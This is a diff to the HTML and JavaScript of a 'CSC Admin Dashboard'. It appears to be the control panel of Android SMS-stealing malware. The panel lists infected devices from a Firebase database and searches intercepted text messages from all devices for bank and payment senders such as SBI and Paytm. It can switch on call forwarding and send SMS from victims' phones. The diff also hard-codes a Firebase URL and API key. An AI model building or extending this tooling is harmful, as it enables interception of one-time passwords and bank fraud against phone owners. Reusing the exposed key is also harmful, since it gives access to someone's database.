@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>CSC Admin Dashboard - Full Search</title>
+<title>CSC Admin Dashboard - Full Working</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 :root{
@@ -31,6 +31,57 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .fg label{display:block;font-size:11px;font-weight:700;color:var(--muted);margin-bottom:5px;}
 .fg input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;font-size:14px;outline:none;}
 .fg input:focus{border-color:var(--purple2);}
+</style>
+</head>
+<body>
+  <div id="login-screen">
+  <div class="login-card">
+    <div class="ic">🔐</div>
+    <h2>Admin Login</h2>
+    <p>Enter Admin Password</p>
+    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
+    <button class="pbtn" onclick="doLogin()">Login</button>
+    <div class="errbox" id="login-err"></div>
+  </div>
+</div>
+
+<div id="setup-screen">
+  <div class="setup-card">
+    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
+    <div class="fg"><label>Firebase URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
+    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." value="AIzaSyAniMS9v56_LHDoYg3eqyjjJAWeNUHOias"></div>
+    <div class="fg"><label>Main Node</label><input id="cfg-node" value="csc6"></div>
+    <button class="pbtn" onclick="saveConfig()">Save & Connect</button>
+    <div class="errbox" id="setup-err"></div>
+  </div>
+</div>
+
+<div id="app">
+  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="logout()">Logout</button></div></div>
+  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
+  <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
+</div>
+<div id="detail-screen">
+  <div class="dtopbar"><button class="bbtn" onclick="goBack()">← Back</button><div class="dtitle" id="detail-title">Device</div></div>
+  <div class="dactions"><button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button><button class="actbtn" onclick="openSmsSend()">✉️ SEND SMS</button></div>
+  <div class="sms-list-wrap" id="sms-list"></div>
+</div>
+
+<div id="search-screen">
+  <div class="topbar"><div class="topbar-title">🔍 Search Results</div><button class="xbtn" onclick="clearSearch()">← Back to Dashboard</button></div>
+  <div style="padding:11px 16px;background:#fff;border-bottom:1px solid var(--border);" id="search-summary"></div>
+  <div style="padding:8px 16px 80px;" id="search-results-list"></div>
+</div>
+
+<div class="overlay" id="dlg-cf"><div class="dialog"><div class="dhdr">📞 Call Forwarding</div><div class="dbody"><div id="sim-list"></div><div class="fwd-lbl">Forward To Number</div><input class="dinput" id="cf-number" placeholder="+91XXXXXXXXXX" type="tel" /><div class="dbtn-row"><button class="dbtn-h" onclick="doCF('active')">ACTIVATE</button><button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVATE</button></div><button class="dbtn" onclick="doCF('check')">CHECK STATUS</button><div class="cf-res" id="cf-result"></div><button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button></div></div></div>
+
+<div class="overlay" id="dlg-sms"><div class="dialog"><div class="dhdr">✉️ Send SMS</div><div class="dbody"><input class="dinput" id="sms-to" placeholder="Recipient Number" type="tel" /><textarea class="dinput" id="sms-msg" placeholder="Message" rows="4"></textarea><button class="dbtn" onclick="doSendSms()">SEND</button><button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button></div></div></div>
+
+<div class="overlay" id="dlg-update"><div class="dialog"><div class="dhdr">🔄 Update Number</div><div class="dbody"><input class="dinput" id="update-num" placeholder="New Number" type="tel" /><button class="dbtn" onclick="doUpdateNo()">UPDATE</button><button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button></div></div></div>
+
+<div id="toast"></div>
+
+<style>
 #app{display:none;flex-direction:column;min-height:100vh;}
 .topbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;}
 .topbar-title{color:#fff;font-size:16px;font-weight:700;display:flex;align-items:center;gap:8px;}
@@ -63,69 +114,21 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .son{color:var(--green);}
 .soff{color:var(--red);}
 .sbadge{background:var(--purple-light);color:var(--purple);font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;margin-left:auto;}
-</style>
-</head>
-<body>
-  <div id="login-screen">
-  <div class="login-card">
-    <div class="ic">🔐</div>
-    <h2>Admin Login</h2>
-    <p>Enter Admin Password</p>
-    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
-    <button class="pbtn" onclick="doLogin()">Login</button>
-    <div class="errbox" id="login-err"></div>
-  </div>
-</div>
-
-<div id="setup-screen">
-  <div class="setup-card">
-    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
-    <div class="fg"><label>Firebase URL</label><input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" /></div>
-    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." /></div>
-    <div class="fg"><label>Main Node</label><input id="cfg-node" value="csc6" /></div>
-    <button class="pbtn" onclick="saveConfig()">Save & Continue</button>
-    <div class="errbox" id="setup-err"></div>
-  </div>
-</div>
-
-<div id="app">
-  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="logout()">Logout</button></div></div>
-  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS (SBI, Paytm, Nearby, Spice, etc.)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
-  <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
-</div>
-
-<div id="detail-screen"><div class="dtopbar"><button class="bbtn" onclick="goBack()">← Back</button><div class="dtitle" id="detail-title">Device</div></div><div class="dactions"><button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button><button class="actbtn" onclick="openSmsSend()">✉️ SEND SMS</button></div><div class="sms-list-wrap" id="sms-list"></div></div>
-
-<div id="search-screen"><div class="topbar"><div class="topbar-title">🔍 Search Results</div><button class="xbtn" onclick="clearSearch()">← Back to Dashboard</button></div><div style="padding:11px 16px;background:#fff;border-bottom:1px solid var(--border);" id="search-summary"></div><div style="padding:8px 16px 80px;" id="search-results-list"></div></div>
-
-<div class="overlay" id="dlg-cf"><div class="dialog"><div class="dhdr">📞 Call Forwarding</div><div class="dbody"><div id="sim-list"></div><div class="fwd-lbl">Forward To Number</div><input class="dinput" id="cf-number" placeholder="+91XXXXXXXXXX" type="tel" /><div class="dbtn-row"><button class="dbtn-h" onclick="doCF('active')">ACTIVATE</button><button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVATE</button></div><button class="dbtn" onclick="doCF('check')">CHECK STATUS</button><div class="cf-res" id="cf-result"></div><button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button></div></div></div>
-
-<div class="overlay" id="dlg-sms"><div class="dialog"><div class="dhdr">✉️ Send SMS</div><div class="dbody"><input class="dinput" id="sms-to" placeholder="Recipient Number" type="tel" /><textarea class="dinput" id="sms-msg" placeholder="Message" rows="4"></textarea><button class="dbtn" onclick="doSendSms()">SEND</button><button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button></div></div></div>
-
-<div class="overlay" id="dlg-update"><div class="dialog"><div class="dhdr">🔄 Update Number</div><div class="dbody"><input class="dinput" id="update-num" placeholder="New Number" type="tel" /><button class="dbtn" onclick="doUpdateNo()">UPDATE</button><button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button></div></div></div>
-
-<div id="toast"></div>
-
-<style>
 #detail-screen .dtopbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;gap:11px;position:sticky;top:0;}
 #detail-screen .bbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:7px 12px;cursor:pointer;}
 #detail-screen .dtitle{color:#fff;font-size:15px;font-weight:700;flex:1;}
 #detail-screen .dactions{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:13px 16px;}
 #detail-screen .actbtn{background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:13px;font-weight:700;cursor:pointer;}
 #detail-screen .sms-list-wrap{padding:0 16px 80px;}
-#detail-screen .scard{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);}
-#detail-screen .sadr{font-size:14px;font-weight:600;margin-bottom:5px;word-break:break-all;}
-#detail-screen .sbody{font-size:13px;color:var(--muted);line-height:1.6;word-break:break-all;}
-#detail-screen .stime{font-size:11px;color:var(--muted);text-align:right;margin-top:7px;}
-
+.scard{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);}
+.sadr{font-size:14px;font-weight:600;margin-bottom:5px;word-break:break-all;}
+.sbody{font-size:13px;color:var(--muted);line-height:1.6;word-break:break-all;}
+.stime{font-size:11px;color:var(--muted);text-align:right;margin-top:7px;}
 #search-screen .src-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;}
-#search-screen .src-card:active{transform:scale(.98);}
 #search-screen .sdlbl{font-size:12px;font-weight:700;color:var(--purple);background:var(--purple-light);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:8px;}
-#search-screen .smcnt{font-size:11px;color:var(--muted);margin-left:6px;}
 #search-screen .highlight{background:#fef08a;color:#713f12;border-radius:3px;padding:0 2px;font-weight:bold;}
-
 .overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:500;display:none;align-items:center;justify-content:center;padding:16px;}
-.dialog{background:#fff;border-radius:20px;width:100%;max-width:440px;overflow:hidden;max-height:90vh;overflow-y:auto;}
+.dialog{background:#fff;border-radius:20px;width:100%;max-width:440px;overflow:hidden;}
 .dhdr{padding:17px 20px;text-align:center;font-size:17px;font-weight:700;color:#fff;background:linear-gradient(135deg,var(--purple),var(--purple2));}
 .dbody{padding:18px 20px;}
 .dinput{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;font-size:15px;outline:none;margin-bottom:11px;}
@@ -144,15 +147,14 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .sim-rb.chk{border-color:var(--purple2);}
 .sim-rb.chk::after{content:'';display:block;width:8px;height:8px;border-radius:50%;background:var(--purple2);margin:2px;}
 .cf-res{background:#f0fdf4;border:1px solid #bbf7d0;color:#15803d;border-radius:8px;padding:9px 13px;font-size:13px;margin-bottom:10px;display:none;text-align:center;}
-.fwd-lbl{font-size:13px;color:var(--muted);margin-bottom:7px;text-align:center;}
 .loading{display:flex;justify-content:center;padding:48px;gap:11px;color:var(--muted);}
 .spinner{width:21px;height:21px;border:2.5px solid var(--border);border-top-color:var(--purple2);border-radius:50%;animation:spin .8s linear infinite;}
 @keyframes spin{to{transform:rotate(360deg);}}
 .empty{text-align:center;padding:48px 16px;color:var(--muted);}
 .empty .ei{font-size:38px;margin-bottom:10px;opacity:.5;}
 #toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1e293b;color:#fff;padding:10px 20px;border-radius:20px;font-size:13px;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none;white-space:nowrap;}
-</style>
-<script>
+         </style>
+         <script>
 // ========== GLOBAL VARIABLES ==========
 var DB_URL = '', API_KEY = '', ROOT_NODE = 'csc6';
 var ADMIN_PASSWORD = '';
@@ -166,7 +168,7 @@ var toastTimer = null;
 function fbGet(path) {
   return fetch(DB_URL + '/' + path + '.json?auth=' + API_KEY)
     .then(function(r) { return r.json(); })
-    .catch(function(e) { console.error('fbGet error:', e); return null; });
+    .catch(function(e) { console.error(e); return null; });
 }
 
 function fbSet(path, data) {
@@ -177,7 +179,7 @@ function fbSet(path, data) {
   }).then(function(r) { return r.json(); });
 }
 
-// ========== SAVE FIREBASE CONFIG ==========
+// ========== SAVE CONFIG ==========
 function saveConfig() {
   DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/, '');
   API_KEY = document.getElementById('cfg-key').value.trim();
@@ -206,6 +208,7 @@ function saveConfig() {
     document.getElementById('login-pass').focus();
     btn.disabled = false;
     btn.textContent = 'Save & Continue';
+    showToast('Configuration saved! Please login.');
   }).catch(function(e) {
     showSetupErr('Connection failed: ' + e.message);
     btn.disabled = false;
@@ -246,7 +249,7 @@ function logout() {
   document.getElementById('login-pass').value = '';
   showToast('Logged out');
 }
-  // ========== DATA LOADING ==========
+           // ========== LOAD DATA ==========
 function loadData() {
   fbGet(ROOT_NODE + '/All_User').then(function(data) {
     if (!data) {
@@ -408,8 +411,8 @@ function goBack() {
     document.getElementById('app').style.display = 'flex';
   }
   window.scrollTo(0, 0);
-  }
-  // ========== GLOBAL SEARCH - ALL DEVICES ==========
+      }
+           // ========== GLOBAL SEARCH - ALL DEVICES ==========
 function onSearch(val) {
   var clearBtn = document.getElementById('search-clear-btn');
   clearBtn.style.display = val ? 'block' : 'none';
@@ -498,7 +501,7 @@ function highlightText(text, keyword) {
     return text;
   }
 }
-  // ========== CALL FORWARDING ==========
+           // ========== CALL FORWARDING ==========
 function openCallFwd() {
   var dev = DEVICES[currentDeviceKey];
   if (!dev) { showToast('Device not found'); return; }
